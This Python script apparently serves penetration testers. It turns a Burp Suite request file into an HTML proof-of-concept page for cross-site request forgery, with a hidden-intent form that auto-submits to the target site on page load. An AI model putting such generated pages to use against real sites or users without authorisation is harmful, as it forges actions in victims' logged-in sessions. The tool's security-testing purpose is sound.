import argparse
import re
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def parse_request(file_path):
    try:
        with open(file_path, 'r') as file:
            request_data = file.read()
        return request_data
    except FileNotFoundError:
        logger.error(f"File not found: {file_path}")
        return None

def get_host(request_data):
    for line in request_data.split('\n'):
        if line.startswith('Host:'):
            return line.split('Host: ')[1].strip()
    return ''

def get_path_and_method(request_data):
    first_line = request_data.split('\n')[0]
    method, path = first_line.split(' ')[:2]
    return method, path

def parse_parameters(request_data):
    parameter_section = request_data.split('\n\n')[1]
    parameters = {}

    if 'application/x-www-form-urlencoded' in request_data:
        for param in parameter_section.split('&'):
            if param:
                key, value = param.split('=')
                parameters[key] = value
    else:
        logger.error("Invalid request format: missing 'application/x-www-form-urlencoded'")
        return None
    return parameters

def create_form(parameters, url, method):
    form_html = f'''
    <!DOCTYPE html>
    <html>
    <head>
      <title>CSRF POC</title>
    </head>
    <body>
      <form action="https://{url}" method="{method}">
    '''

    for key, value in parameters.items():
        input_field = f'<input type="text" id="{key}" name="{key}" value="{value}"><br>\n'
        form_html += input_field

    form_html += '''
        <input type="submit" value="Submit">
      </form>
      <script>document.forms[0].submit();</script>
    </body>
    </html>
    '''

    return form_html


def save_to_file(file_path, content):
    try:
        with open(file_path, 'w') as file:
            file.write(content)
        logger.info(f"File saved: {file_path}")
    except OSError:
        logger.error(f"Failed to save file: {file_path}")

def main():
    parser = argparse.ArgumentParser(description='CSRF POC Generator')
    parser.add_argument('-f', '--file', help='Path to the Burp Suite request file')
    args = parser.parse_args()

    if not args.file:
        logger.error('Please provide the path to the request file using -f or --file option.')
        return

    request_data = parse_request(args.file)
    if request_data is None:
        return

    host = get_host(request_data)
    method, path = get_path_and_method(request_data)
    url = host + path
    parameters = parse_parameters(request_data)
    if parameters is None:
        return

    form_html = create_form(parameters, url, method)

    poc_file = re.sub(r'[^\w\s-]', '', host.strip()) + '.html'
    save_to_file(poc_file, form_html)

    logger.info(f'CSRF POC generated successfully: {poc_file}')

if __name__ == '__main__':
    main()